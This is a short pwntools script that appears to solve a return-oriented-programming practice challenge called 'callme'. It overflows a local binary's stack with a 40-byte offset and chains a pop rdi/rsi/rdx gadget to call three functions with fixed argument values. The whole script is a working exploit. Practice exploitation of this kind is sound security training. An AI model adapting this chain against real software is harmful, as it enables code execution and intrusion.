#!/usr/bin/python3

from pwn import *

elf = ELF('./callme')
p = process('./callme')

offset = 40

callme1 = p64(elf.symbols['callme_one'])
callme2 = p64(elf.symbols['callme_two'])
callme3 = p64(elf.symbols['callme_three'])


# gadgets
# 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
# 0x00000000004006be: ret;
pops = p64(0x40093c)
ret = p64(0x4006be)

# consts
beef = p64(0xdeadbeefdeadbeef)
cafe = p64(0xcafebabecafebabe)
food = p64(0xd00df00dd00df00d)

# payload
payload = b'A' * offset
payload += ret

payload += pops
payload += beef + cafe + food
payload += callme1

payload += pops
payload += beef + cafe + food
payload += callme2

payload += pops
payload += beef + cafe + food
payload += callme3

p.send(payload)
output = p.recvall()

log.info(f'Sent {payload}')
log.info(f'Recv {output}')
